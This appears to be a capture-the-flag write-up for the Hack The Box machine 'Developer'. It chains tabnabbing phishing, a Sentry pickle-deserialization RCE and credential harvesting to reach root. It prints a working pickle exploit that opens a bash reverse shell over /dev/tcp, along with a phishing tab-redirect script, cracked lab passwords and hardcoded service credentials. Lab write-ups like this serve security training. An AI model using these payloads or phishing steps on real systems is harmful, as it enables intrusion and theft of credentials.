# Developer

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.11.103 |
| **Status** | Retired |

## Overview
Developer is a hard-difficulty Linux machine hosting a Django-based "Free CTF Platform". The intended path starts with a **tabnabbing** attack: a cloned copy of the site's login page is hosted on an attacker-controlled server and used to phish an administrator's credentials while also redirecting the original browser tab to hide the trick (based on a public tabnabbing writeup, HackerOne report #179568). The stolen admin credentials expose Django admin data that leads to discovery of a hidden subdomain running **Sentry**, whose outdated version is vulnerable to an authenticated pickle-deserialization RCE. Exploiting Sentry yields a `www-data` shell, where hardcoded database credentials in Django/Sentry configuration files are used to dump application user password hashes, one of which cracks and allows an SSH pivot to the user `karl`. Root is ultimately reached by reverse engineering a custom `authenticator` binary (AES-CTR encryption with a hardcoded key/IV visible in disassembly) to recover a password used for further privilege escalation.

## Reconnaissance
`nmap -sC -sV -A` against `developer.htb` (10.10.11.103) showed:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Developer: Free CTF Platform
```

The site on port 80 is a Django application acting as a small, self-hosted CTF platform with user sign-up/login and a set of downloadable "challenges" (crypto/pwn puzzles unrelated to the underlying box compromise, used as in-universe flavor for the platform).

## Enumeration
The `/admin` path redirected to `/admin/login/?next=/admin/`, confirming a Django admin panel. Enumerating platform users/challenges surfaced usernames such as `jacob@developer.htb` (Jacob Taylor, member) and `karl@developer.htb` (Karl Travis, owner), and an admin account `admin@developer.ctf`.

To capture admin credentials, a cloned copy of the site's `/accounts/login/` page was hosted on an attacker-controlled web server (kept in this repo as `files/phishing-login-page.html`). Two changes were made to the mirrored HTML:
- The form `action` was changed to post to the attacker's IP instead of the real site.
- A tabnabbing snippet (lines borrowed from the referenced HackerOne report) was added so that, once the victim interacts with the cloned tab, the *original* opener/parent tab is silently redirected away, reducing suspicion:

```html
<script>
if (window.opener) window.opener.parent.location.replace('http://10.10.14.X');
if (window.parent != window) window.parent.location.replace('http://10.10.14.X');
</script>
```

An admin who opened the crafted link and logged in on the fake page had their POST request captured on the attacker's listener, disclosing the credentials `admin:SuperSecurePassword@HTB2021` for `admin@developer.ctf`.

Logging into the real Django admin panel with these credentials exposed backend data, including a `phished_credentials.xlsx` artifact (one of the platform's own "challenge" files) and, more importantly: a previously undisclosed hostname: **`developer-sentry.developer.htb`**, a Sentry error-tracking instance reachable once added to `/etc/hosts`.

## Foothold
The Sentry instance's admin/auditlog pages (`/admin/sentry/auditlogentry/`) confirmed an outdated Sentry version affected by a known **pickle deserialization** vulnerability that allows authenticated users to achieve remote code execution (documented in the Synacktiv advisory "Sentry: Pickle to RCE", referenced locally as a PDF and publicly available at synacktiv's advisories page). The exploit builds a malicious pickled `subprocess.Popen` object, compresses and base64-encodes it, and submits it through the vulnerable Sentry code path:

```python
from cPickle import dumps
import subprocess
from base64 import b64encode
from zlib import compress
from shlex import split

class PickleExploit(object):
    def __init__(self, command_line):
        self.args = split(command_line)
    def __reduce__(self):
        return (subprocess.Popen, (self.args,))

print(b64encode(compress(dumps(PickleExploit(
    'bash -c "echo /bin/bash -i >& /dev/tcp/10.10.14.X/4447 0>&1 |base64 -d|bash"'
)))))
```

This script is kept in the repository as `files/sentry-pickle-exploit.py`. Submitting the generated payload triggered code execution on the server, returning a reverse shell as `www-data`.

## Privilege Escalation
As `www-data`, the Django CTF platform's settings file (`/var/www/developer_ctf/developer/ctf/settings.py`) and Sentry's configuration under `/etc/sentry/` both contained hardcoded credentials:

```
# Django (PostgreSQL "platform" DB)
USER: ctf_admin   PASSWORD: CTFOG2021

# Sentry (PostgreSQL "sentry" DB) + Redis
USER: sentry      PASSWORD: SentryPassword2021
Redis password:   g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe
```

Connecting to the Sentry Postgres database (`psql --host=localhost --username=sentry --password sentry`) and dumping its user table returned `pbkdf2_sha256` password hashes for the platform's real users (`karl@developer.htb`, `jacob@developer.htb`, `admin@developer.ctf`, `rsff@nice.htb`). Cracking/recovering these credentials yielded:

```
karl@developer.htb : insaneclownposse
```

These credentials were valid for SSH, providing a shell as the user **karl** (`www-data` → `karl`).

From karl's home directory, a custom `authenticator` binary was present (kept out of the repository: see below). Disassembling it in Ghidra/GDB showed it performs **AES-CTR** decryption with a hardcoded key, IV, and ciphertext embedded directly in the binary's `.rodata`/stack setup:

```
movaps xmm0, XMMWORD PTR [rip+0x42711]   ; -> Pass (ciphertext)
movaps xmm0, XMMWORD PTR [rip+0x42717]   ; -> Key
movdqa xmm0, XMMWORD PTR [rip+0x42713]   ; -> IV
```

Extracting these three 16-byte values and decrypting them with CyberChef's AES-CTR recipe recovered a cleartext credential:

```
RustForSecurity@Developer@2021
```

This recovered secret was used to escalate further (as the elevated/root-equivalent credential expected by the `authenticator` program's workflow), completing the chain to root and allowing `/root/root.txt` to be read.

## Lessons Learned
- Tabnabbing (`window.opener`/`window.parent` redirection) combined with a cloned login form is a low-tech but effective way to phish credentials from users who trust an already-open tab.
- Exposing internal/auxiliary hostnames (like a Sentry instance) through an admin panel is an information-disclosure risk that widens the attack surface.
- Outdated Sentry versions are vulnerable to authenticated pickle deserialization RCE: application configuration files must never store plaintext database/service credentials.
- Reverse engineering a statically-keyed AES-CTR "authenticator" is straightforward once the key/IV are visible directly in disassembly: secrets must never be hardcoded in shipped binaries.

## Tools & References
- Custom cloned/modified login page for phishing: see `files/phishing-login-page.html`.
- `Sentry-Pickle-Exploit.py`: see `files/sentry-pickle-exploit.py`.
- Sentry Pickle RCE advisory: Synacktiv, "Sentry: exploiting a Pickle deserialization vulnerability" (`https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf`).
- Tabnabbing technique reference: HackerOne report #179568 (`https://hackerone.com/reports/179568`).
- Ghidra / GDB for static/dynamic reverse engineering of the `authenticator` binary; CyberChef for AES-CTR decryption of the recovered key material.
- `psql` for direct PostgreSQL enumeration of the Sentry/Django databases.
- **Omitted from repository** (loot/large/binary: content described above and in-line where relevant):
  - `authenticator` (10.6 MB compiled Rust/C binary, duplicated in two locations): the AES-CTR protected credential binary; its logic is summarized above.
  - `Auth.rep/` (Ghidra reverse-engineering project, ~13 MB database) and `Auth.gpr`: the Ghidra project used to analyze `authenticator`; omitted for size, findings captured in the Privilege Escalation section.
  - `admincred.pcapng`: packet capture of the phished admin POST request; the recovered credential is documented above.
  - `id_rsa` / `id_rsa.pub`: the note-taker's personal SSH keypair (comment `shorida@randy`), not victim loot; omitted per key-hygiene policy.
  - `Writeup/Developer.pdf` and `Writeup/Pictures/*`: a large (~11 MB) pre-existing PDF writeup and dozens of screenshots, superseded by this document.
  - `Writeup/Server/`: a full HTTrack mirror of the live site used to build the phishing clone; the single relevant page is kept as `files/phishing-login-page.html`.
  - `Files/Challenges/*.zip`, `Files/phished*.xlsx/.zip`: the CTF platform's own in-universe side-challenge archives (crypto/pwn puzzles unrelated to the host compromise); not required to reproduce the attack path.
